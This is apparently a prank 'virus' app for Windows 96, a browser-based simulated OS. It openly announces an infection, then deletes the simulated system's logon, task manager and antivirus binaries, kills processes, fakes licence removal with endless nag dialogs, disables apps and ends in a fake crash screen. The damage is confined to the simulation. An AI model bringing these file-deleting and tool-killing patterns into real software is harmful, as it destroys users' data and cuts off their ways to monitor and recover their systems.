//!wrt

const { WindowParams } = w96;
const { Theme, MsgBoxSimple } = w96.ui;
const { has: hasFlag, set: setFlag, clear: clearFlags}  = w96.sys.flags;
const { IFileSystem, RemoteReadOnlyFileSystem } = w96.fstype;
const { DirMetadataReader, execFile, execCmd, renderBSOD } = w96.sys;
const { procMgr } = w96.state;
const { setEnv } = w96.sys.env;

function start() {
    MsgBoxSimple.error("Woops!", "This copy of Windows is now infected with a system destroying virus.\n\nHave fun!", "OK");
                
    FS.rm("C:/system/local/bin/logon");
    FS.rm("C:/system/local/bin/notron");
    FS.rm("C:/system/local/bin/taskmgr");

    //FS.rm("C:/system/local/bin/reboot");
    //FS.cpfile("C:/system/boot/apps/hello", "C:/system/local/bin/reboot")
    //FS.writestr(target, JSON.stringify(linkObj));

    for(let p of w96.state.processes) {
        if(!p)
            continue;
        if(p.title=="taskmgr" || p.title=="notron"){
            procMgr.quit(parseInt(p.appId), true);
        }
    }
    
    setTimeout(()=>{
        setTimeout(()=>{
            fxMap.disco.start()
        }, 5000);
        setTimeout(()=>{
            fxMap.spinner.start()
        }, 1000);
        setTimeout(()=>{
            fxMap.zoom.start()
        }, 10000);
        
        MsgBoxSimple.confirm("PARTY!", (v)=>{
            if(!v) {
                fxMap.disco.stop()
                fxMap.spinner.stop()
                fxMap.zoom.stop()
                setTimeout(()=>{
                    fxMap.disco.stop()
                }, 5000);
                setTimeout(()=>{
                    fxMap.spinner.stop()
                }, 1000);
                setTimeout(()=>{
                    fxMap.zoom.stop()
                }, 10000);
            }
        });
    }, 130000);
    setTimeout(()=>{
        setInterval(()=>{
            execCmd("youare")
        }, 20000);
    }, 30000);
    setTimeout(()=>{
        setInterval(()=>{
            execCmd("norton")
            setTimeout(()=>{
                execCmd("pchc")
            }, 6000);
        }, 20000);
    }, 60000);
    setTimeout(()=>{
        MsgBoxSimple.error("Bye bye!", "I just removed your product key!", "OK");
        this.removeLicense()
        setTimeout(()=>{
            execCmd("wpa")
        }, 2000);
    }, 120000);
    //*/
    setTimeout(()=>{
        for(let p of w96.state.processes) {
            if(!p)
                continue;

            procMgr.quit(parseInt(p.appId ), true);
        }
        setTimeout(()=>{
            renderBSOD("Critical process died!")
        }, 500);//150000);
    }, 150000);//2000);//5000);
}

function _clsAdd_mgfx(c) {
    const maingfx = document.querySelector("#maingfx");
    maingfx.classList.add(c);
}

function _clsRemove_mgfx(c) {
    const maingfx = document.querySelector("#maingfx");
    maingfx.classList.remove(c);
}

function _clsAdd_body(c) {
    const _body = document.querySelector("body");
    _body.classList.add(c);
}

function _clsRemove_body(c) {
    const _body = document.querySelector("body");
    _body.classList.remove(c);
}

const fxMap = {
    hue: {
        start: function() {
            _clsAdd_body('fx-hue');
        },
        stop: function() {
            _clsRemove_body('fx-hue');
        }
    },
    spinner: {
        start: function() {
            _clsAdd_body('fx-spin');
        },
        stop: function() {
            _clsRemove_body('fx-spin');
        }
    },
    "upside-down": {
        start: function() {
            _clsAdd_body('fx-upside-down');
        },
        stop: function() {
            _clsRemove_body('fx-upside-down');
        }
    },
    zoom: {
        start: function() {
            _clsAdd_body('fx-zoom');
        },
        stop: function() {
            _clsRemove_body('fx-zoom');
        }
    },
    deepfryer: {
        start: function() {
            _clsAdd_body('fx-deepfryer');
        },
        stop: function() {
            _clsRemove_body('fx-deepfryer');
        }
    },
    grayscale: {
        start: function() {
            _clsAdd_body('fx-grayscale');
        },
        stop: function() {
            _clsRemove_body('fx-grayscale');
        }
    },
    invert: {
        start: function() {
            _clsAdd_body('fx-invert');
        },
        stop: function() {
            _clsRemove_body('fx-invert');
        }
    },
    blur: {
        start: function() {
            _clsAdd_body('fx-blur');
        },
        stop: function() {
            _clsRemove_body('fx-blur');
        }
    },
    disco: {
        start: function() {
            var deskOverlay = document.querySelector('.fx-desk-overlay');
            if(!deskOverlay) {
                deskOverlay = document.createElement('div');
                deskOverlay.classList.add('fx-desk-overlay', 'fx-hue');
                document.querySelector('.user-desktop').appendChild(deskOverlay);
            }
        },
        stop: function() {
            var fxDeskOverlay = document.querySelector('.fx-desk-overlay');
            if(fxDeskOverlay)
                fxDeskOverlay.remove();
        }
    },
    neon: {
        start: function() {
            var neonStyleEl = document.querySelector(".fx-neon-css");

            if(!neonStyleEl) {
                neonStyleEl = document.createElement('style');
                neonStyleEl.classList.add('fx-neon-css');
                document.body.appendChild(neonStyleEl);
            }

            neonStyleEl.innerHTML = `
            .window-dlg:not(.ui-sortable-helper) {
                box-shadow: 0 0 12px 6px #c725d4 !important;
            }
            
            .start-menu {
                box-shadow: 0px 0px 20px 4px lime !important;
            }
            
            .wcontext-menu {
                box-shadow: 0 0 11px 0px cyan !important;
            }`;
        },
        stop: function() {
            var neonStyleEl = document.querySelector(".fx-neon-css");
            if(neonStyleEl)
                neonStyleEl.remove();
        }
    },
    sepia: {
        start: function() {
            _clsAdd_body('fx-sepia');
        },
        stop: function() {
            _clsRemove_body('fx-sepia');
        }
    },
    bright: {
        start: function() {
            _clsAdd_body('fx-bright');
        },
        stop: function() {
            _clsRemove_body('fx-bright');
        }
    },
    bw: {
        start: function() {
            _clsAdd_body('fx-bw');
        },
        stop: function() {
            _clsRemove_body('fx-bw');
        }
    }
}


class GUIApplication extends WApplication {
    constructor() {
        super();
    }

    async main(argv) {
        super.main(argv);
        this._createWindow();
    }

    _resetFx() {
        this.fxQueue.forEach((fxN)=>{
            fxMap[fxN].stop();
        });

        this.fxQueue = [];
    }

    removeLicense() {
        MsgBoxSimple.error("Activation Error", "This copy of Windows is not genuine.", "OK");
        // Set bg to black and other fun stuff
        document.querySelector(".user-desktop").style.background = "black";
        const not_genuine = document.createElement('div');
        not_genuine.classList.add('troll-not-genuine');
        not_genuine.innerHTML = `<span class="left">This copy of Windows is not genuine</span>
        <span class="right">This copy of Windows is not genuine</span>
        <span class="bleft">This copy of Windows is not genuine</span>
        <span class="bright">This copy of Windows is not genuine</span>`;
        document.body.appendChild(not_genuine);

        const movingText = document.createElement('div');
        movingText.innerText = "This copy of Windows is not genuine";
        movingText.classList.add('troll-not-genuine');

        let inc_x = 1;
        let inc_y = 1;

        function render() {
            const bounds = movingText.getBoundingClientRect();
            movingText.style.top = `${bounds.top + inc_y}px`;
            movingText.style.left = `${bounds.top + inc_x}px`;

            if(bounds.y > window.innerHeight)
                inc_y = -1;
            else if(inc_y < 0)
                inc_y = 1;

            if(bounds.x > window.innerWidth)
                inc_x = -1;
            else if(inc_x < 0)
                inc_x = 1;

            requestAnimationFrame(render);
        }

        render();

        document.body.appendChild(movingText);

        deregisterApp("explorer");
        deregisterApp("textpad");
        deregisterApp("dyk");
        
        registerApp("explorer", [], (args)=>{
            MsgBoxSimple.error("Error", "This app is disabled because you didn't register your copy.", "Damn");
        });

        registerApp("textpad", [], (args)=>{
            MsgBoxSimple.error("Error", "This app is disabled because you didn't register your copy.", "Damn");
        });

        registerApp("dyk", [], (args)=>{
            MsgBoxSimple.info("Pro Tip", "You can end this hell of unregistered windows if you restart via start menu.", ":O");
        });

        document.body.oncontextmenu = (e)=>{
            e.preventDefault();
            MsgBoxSimple.error("Error", "Please register your copy of Windows to continue using Windows 96 uninterrupted.", "Damn").dlg.setPosition(e.x, e.y);
        }

        const stEl = document.createElement('style');
        stEl.innerText = `.w96_sm_logo .container .text::after {
            content: 'Windows 96 (UNREGISTERED)';
        }
        
        .shell-icon .icon-image {
            background: url(system/resource/themes/default/icons/error.png) !important;
        }`;
        document.body.appendChild(stEl);

        setTimeout(()=>{
            MsgBoxSimple.error("Error", "Color display is only available for genuine Windows 96.", ":(");
            document.body.style.filter = "grayscale(1)";
        }, 2000);

        setInterval(()=>{
            MsgBoxSimple.error("Error", "Failed to load DLL - You didn't register your copy of Windows.", "Damn").dlg.randomizePosition();
        }, 10000);

        window.notGenuine = true;
    }



    _createWindow() {
        setTimeout(()=>{
                this.terminate();
                start()
            //}
        }, 60000);
    }
}

return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);